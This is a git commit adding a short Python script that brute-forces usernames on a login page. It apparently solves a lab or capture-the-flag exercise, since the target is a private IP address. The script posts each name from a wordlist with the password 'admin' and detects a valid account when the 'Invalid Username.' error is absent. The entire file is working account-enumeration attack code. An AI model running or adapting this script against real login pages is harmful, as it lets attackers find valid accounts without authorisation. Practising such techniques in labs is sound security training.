93abc227cf33ecc4dfdef9ed504b685ba06e44c9
Skickar <40251293+skickar@users.noreply.github.com>
2022-02-01 22:46:14 -0700

    Solution to brute force usernames

---
+++ BruteUsernames.py
@@ -0,0 +1,21 @@
+import requests
+import random
+
+usernameList = "18usernames.txt"
+requestURL = 'http://192.168.59.192/login'
+
+with open(usernameList, 'r') as f:
+    names = [name.strip() for name in f.readlines() if name.strip()]
+
+random.shuffle(names)
+
+wrong = True
+while wrong:
+    for name in names:
+        print("Trying username: {}".format(name))
+        r = requests.post(requestURL, data={"username":name, "password":"admin"})
+        if "<p class=is-warning>Invalid Username.</p>" not in r.text and 'Error processing request' not in r.text:
+            wrong = False
+            break
+
+print("Found admin name:", name)
